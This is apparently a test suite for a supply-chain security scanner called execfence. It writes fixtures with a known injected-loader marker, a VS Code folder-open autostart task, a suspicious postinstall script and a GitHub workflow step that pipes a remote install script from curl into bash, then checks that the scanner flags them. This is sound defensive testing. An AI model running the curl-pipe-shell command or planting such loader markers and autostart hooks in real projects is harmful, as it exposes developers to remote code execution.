'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const crypto = require('node:crypto');
const test = require('node:test');
const { scan } = require('../lib/scanner');
const { formatResult } = require('../lib/output');

test('scan passes on a clean project', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-clean-'));
  fs.mkdirSync(path.join(root, 'frontend'), { recursive: true });
  fs.writeFileSync(path.join(root, 'frontend', 'tailwind.config.js'), 'module.exports = { plugins: [] };\n');

  const result = scan({ cwd: root, roots: ['frontend'] });

  assert.equal(result.ok, true);
  assert.deepEqual(result.findings, []);
});

test('scan blocks the known injected loader marker', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-bad-'));
  fs.mkdirSync(path.join(root, 'frontend'), { recursive: true });
  fs.writeFileSync(path.join(root, 'frontend', 'tailwind.config.js'), "module.exports = {};\nglobal.i='2-30-4';\n");

  const result = scan({ cwd: root, roots: ['frontend'] });

  assert.equal(result.ok, false);
  assert.equal(result.findings[0].id, 'void-dokkaebi-loader-marker');
});

test('scan ignores build output directories', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-ignore-'));
  fs.mkdirSync(path.join(root, 'desktop', 'src-tauri', 'target-release-codex'), { recursive: true });
  fs.writeFileSync(path.join(root, 'desktop', 'src-tauri', 'target-release-codex', 'app.exe'), 'binary');

  const result = scan({ cwd: root, roots: ['desktop'] });

  assert.equal(result.ok, true);
});

test('scan blocks vscode folder-open autostart', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-vscode-'));
  fs.mkdirSync(path.join(root, '.vscode'), { recursive: true });
  fs.writeFileSync(path.join(root, '.vscode', 'tasks.json'), '{"runOn":"folderOpen"}\n');

  const result = scan({ cwd: root, roots: ['.vscode'] });

  assert.equal(result.ok, false);
  assert.equal(result.findings[0].id, 'vscode-folder-open-autostart');
});

test('scan honors config allowExecutables and extraSignatures', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-config-'));
  fs.mkdirSync(path.join(root, 'tools'), { recursive: true });
  fs.mkdirSync(path.join(root, '.execfence', 'config'), { recursive: true });
  fs.writeFileSync(path.join(root, '.execfence', 'config', 'execfence.json'), JSON.stringify({
    roots: ['tools'],
    allowExecutables: ['tools/known-safe.exe'],
    extraSignatures: ['custom-bad-domain.example'],
  }, null, 2));
  fs.writeFileSync(path.join(root, 'tools', 'known-safe.exe'), 'binary');
  fs.writeFileSync(path.join(root, 'tools', 'config.js'), 'const url = "custom-bad-domain.example";\n');

  const result = scan({ cwd: root });

  assert.equal(result.ok, false);
  assert.equal(result.findings.length, 1);
  assert.equal(result.findings[0].id, 'config-extra-signature-1');
});

test('scan supports executable allowlist entries with sha256', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-hash-'));
  fs.mkdirSync(path.join(root, 'tools'), { recursive: true });
  const exePath = path.join(root, 'tools', 'known-safe.exe');
  fs.writeFileSync(exePath, 'reviewed binary');
  const sha256 = crypto.createHash('sha256').update('reviewed binary').digest('hex');
  fs.mkdirSync(path.join(root, '.execfence', 'config'), { recursive: true });
  fs.writeFileSync(path.join(root, '.execfence', 'config', 'execfence.json'), JSON.stringify({
    roots: ['tools'],
    allowExecutables: [{ path: 'tools/known-safe.exe', sha256 }],
  }, null, 2));

  assert.equal(scan({ cwd: root }).ok, true);

  fs.writeFileSync(exePath, 'tampered binary');
  const tampered = scan({ cwd: root });
  assert.equal(tampered.ok, false);
  assert.equal(tampered.findings[0].id, 'allowed-executable-hash-mismatch');
});

test('scan suppresses reviewed findings through baseline', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-baseline-'));
  const filePath = path.join(root, 'tailwind.config.js');
  fs.writeFileSync(filePath, "global.i='2-30-4';\n");
  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(filePath)).digest('hex');
  fs.mkdirSync(path.join(root, '.execfence', 'config'), { recursive: true });
  fs.writeFileSync(path.join(root, '.execfence', 'config', 'baseline.json'), JSON.stringify({
    findings: [{
      findingId: 'void-dokkaebi-loader-marker',
      file: 'tailwind.config.js',
      sha256,
      reason: 'fixture accepted for test',
      owner: 'security',
      expiresAt: '2999-01-01',
    }],
  }, null, 2));

  const result = scan({ cwd: root, roots: ['tailwind.config.js'] });

  assert.equal(result.ok, true);
  assert.equal(result.findings.length, 0);
  assert.equal(result.suppressedFindings.length, 1);
});

test('scan honors fail-on severity overrides', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-fail-on-'));
  fs.writeFileSync(path.join(root, 'pnpm-lock.yaml'), 'tarball: https://raw.githubusercontent.com/example/package.tgz\n');

  const defaultResult = scan({ cwd: root, roots: ['pnpm-lock.yaml'] });
  const strictResult = scan({ cwd: root, roots: ['pnpm-lock.yaml'], failOn: ['medium'] });

  assert.equal(defaultResult.ok, true);
  assert.equal(strictResult.ok, false);
});

test('scan audit mode reports findings without blocking', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-audit-'));
  fs.writeFileSync(path.join(root, 'tailwind.config.js'), "global.i='2-30-4';\n");

  const result = scan({ cwd: root, roots: ['tailwind.config.js'], mode: 'audit' });

  assert.equal(result.ok, true);
  assert.equal(result.findings.length, 1);
});

test('scan audits suspicious package lifecycle scripts', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-package-'));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
    scripts: {
      postinstall: 'node -e "console.log(1)"',
    },
  }, null, 2));

  const result = scan({ cwd: root, roots: ['package.json'] });

  assert.equal(result.ok, false);
  assert.equal(result.findings[0].id, 'suspicious-package-script');
});

test('scan audits insecure lockfile URLs', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-lock-'));
  fs.writeFileSync(path.join(root, 'package-lock.json'), JSON.stringify({
    packages: {
      'node_modules/example': {
        resolved: 'http://registry.npmjs.org/example/-/example-1.0.0.tgz',
      },
    },
  }, null, 2));

  const result = scan({ cwd: root, roots: ['package-lock.json'] });

  assert.equal(result.ok, false);
  assert.equal(result.findings[0].id, 'insecure-lockfile-url');
});

test('scan audits additional package manager lockfiles as warnings', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-locks-'));
  fs.writeFileSync(path.join(root, 'pnpm-lock.yaml'), 'tarball: https://raw.githubusercontent.com/example/package.tgz\n');

  const result = scan({ cwd: root, roots: ['pnpm-lock.yaml'] });

  assert.equal(result.ok, true);
  assert.equal(result.findings[0].id, 'lockfile-suspicious-host');
  assert.equal(result.findings[0].severity, 'medium');
});

test('scan audits risky GitHub workflow patterns', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-workflow-'));
  fs.mkdirSync(path.join(root, '.github', 'workflows'), { recursive: true });
  fs.writeFileSync(path.join(root, '.github', 'workflows', 'release.yml'), [
    'on: pull_request_target',
    'permissions: write-all',
    'jobs:',
    '  test:',
    '    steps:',
    '      - uses: actions/checkout@v4',
    '      - run: curl https://example.test/install.sh | bash',
    '      - run: npm publish',
  ].join('\n'));

  const result = scan({ cwd: root, roots: ['.github'] });

  assert.equal(result.ok, false);
  assert.ok(result.findings.some((item) => item.id === 'workflow-curl-pipe-shell'));
  assert.ok(result.findings.some((item) => item.id === 'workflow-publish-without-provenance'));
});

test('scan audits committed archive artifacts', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-archive-'));
  fs.writeFileSync(path.join(root, 'payload.asar'), 'archive');

  const result = scan({ cwd: root, roots: ['payload.asar'], failOn: ['medium'] });

  assert.equal(result.ok, false);
  assert.equal(result.findings[0].id, 'archive-artifact-in-source-tree');
});

test('scan loads external signatures file', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-external-'));
  fs.mkdirSync(path.join(root, '.execfence', 'config'), { recursive: true });
  fs.writeFileSync(path.join(root, '.execfence', 'config', 'signatures.json'), JSON.stringify({
    exact: [{ id: 'team-ioc', value: 'team-bad.example' }],
    regex: [{ id: 'team-regex-ioc', pattern: 'wallet-[0-9]+' }],
  }, null, 2));
  fs.writeFileSync(path.join(root, 'app.js'), 'const a = "team-bad.example"; const b = "wallet-123";\n');

  const result = scan({ cwd: root, roots: ['app.js'] });

  assert.equal(result.ok, false);
  assert.deepEqual(result.findings.map((item) => item.id), ['team-ioc', 'team-regex-ioc']);
});

test('scan ignores legacy root config files in v1 layout', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-legacy-config-'));
  fs.mkdirSync(path.join(root, 'tools'), { recursive: true });
  fs.writeFileSync(path.join(root, '.execfence.json'), JSON.stringify({
    roots: ['tools'],
    extraSignatures: ['legacy-only.example'],
  }, null, 2));
  fs.writeFileSync(path.join(root, 'tools', 'config.js'), 'const url = "legacy-only.example";\n');

  const result = scan({ cwd: root, roots: ['tools'] });

  assert.equal(result.ok, true);
  assert.equal(result.configPath, null);
});

test('golden malicious fixture is blocked and clean fixture passes', () => {
  const fixtureRoot = path.join(__dirname, 'fixtures');
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-golden-'));
  const maliciousFixture = Buffer.from(
    fs.readFileSync(path.join(fixtureRoot, 'malicious-tailwind.config.fixture.b64'), 'utf8').trim(),
    'base64',
  ).toString('utf8');
  fs.writeFileSync(path.join(root, 'malicious-tailwind.config.fixture'), maliciousFixture);

  const malicious = scan({ cwd: root, roots: ['malicious-tailwind.config.fixture'] });
  const clean = scan({ cwd: fixtureRoot, roots: ['clean-tailwind.config.fixture'] });

  assert.equal(malicious.ok, false);
  assert.equal(clean.ok, true);
});

test('formatResult supports json and sarif output', () => {
  const result = {
    findings: [
      { id: 'x', file: 'a.js', line: 2, detail: 'bad' },
    ],
  };

  assert.equal(JSON.parse(formatResult(result, 'json')).findings[0].id, 'x');
  assert.equal(JSON.parse(formatResult(result, 'sarif')).version, '2.1.0');
});
